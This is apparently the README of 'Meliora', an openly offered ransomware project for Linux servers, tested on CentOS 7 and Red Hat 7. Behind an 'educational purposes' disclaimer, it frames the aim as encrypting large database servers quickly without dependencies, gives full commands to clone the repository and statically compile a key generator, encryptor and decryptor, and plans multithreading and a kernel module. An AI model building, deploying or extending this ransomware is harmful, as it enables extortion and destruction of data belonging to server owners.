# Meliora
Meliora is a Latin adjective meaning "better". It is the neuter plural (nominative or accusative) form of the adjective "melior, 
-or, -us".
It may be used in the accusative and substantively (i.e., as a noun) to mean "better things", "always better", "ever better", or, 
more fully, "for the pursuit of the better".

https://en.wikipedia.org/wiki/Meliora

DISCLAIMER: This is only for testing/educational purposes and can only be used on your own pc or where strict consent has been 
given. Do not use this for illegal purposes.

## Abstract
This is a ransomware for Linux Servers, so it has been successfully tested in Centos 7 and Red Hat 7.

## Intro
Maybe you can share my passion for cryptography, linux and security, if so you this will be funny for you.
This cade was made in 2013 and forgotten, but today it's alive.

## Why
* Because I like, so simple.
* I am so grateful with open source community, thanks to all the people who has been written something to share their knowledge 
with the world... with us.


## Educational goals
* Learn cryptography
* Learn Linux
* Learn cryptopp
* Learn Security

See learning.txt

## Problem
Imagine a Database server wich databases are big, you can't install new packages. So a ransomeware needs:
* run without dependencies
* run fast

## Run
```
yum group install "Development Tools"
yum install glibc-static
yum install libstdc++-static
yum install cryptopp cryptopp-devel

wget https://www.cryptopp.com/cryptopp562.zip
unzip cryptopp562.zip
make libcryptopp.a
cp  libcryptopp.a /usr/lib64/libcrypto.a

git clone https://github.com/liesware/meliora.git
cd meliora
g++ -static -O2   melgen.cpp -o melgen -lcryptopp
./melgen
// Edit config.h 
g++ -static -O2   melen.cpp -o melen -lcryptopp
g++ -static -O2   melde.cpp -o melde -lcryptopp

```
## Next Steps 
* Add multithreading
* Add LKM

if I can help you in something just let know
liesware 4t hotmail d0t com
